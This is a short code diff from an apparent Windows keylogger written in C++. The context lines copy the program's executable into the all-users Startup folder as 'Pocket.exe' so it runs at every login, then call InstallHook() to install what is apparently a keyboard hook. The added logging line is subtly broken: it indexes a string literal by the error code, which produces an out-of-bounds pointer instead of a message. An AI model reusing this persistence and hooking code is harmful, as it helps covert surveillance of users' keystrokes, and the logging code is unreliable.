@@ -34,11 +34,9 @@ int main() {
     const CHAR *newLocation = R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Pocket.exe)";
 
     bool b = CopyFile(path, newLocation, 0);
-    if (!b) {
-        cout << "Error: " << GetLastError() << endl;
-    } else {
-        cout << "Okay " << endl;
-    }
+    // https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
+    if (!b) Helper::writeLog(&"Error writing to startup dir (most likely not admin) " [ GetLastError()]);
+    else Helper::writeLog("Wrote to startup dir");
 
     IO::mkDir(IO::getPath(true));  // creates default path
     InstallHook();
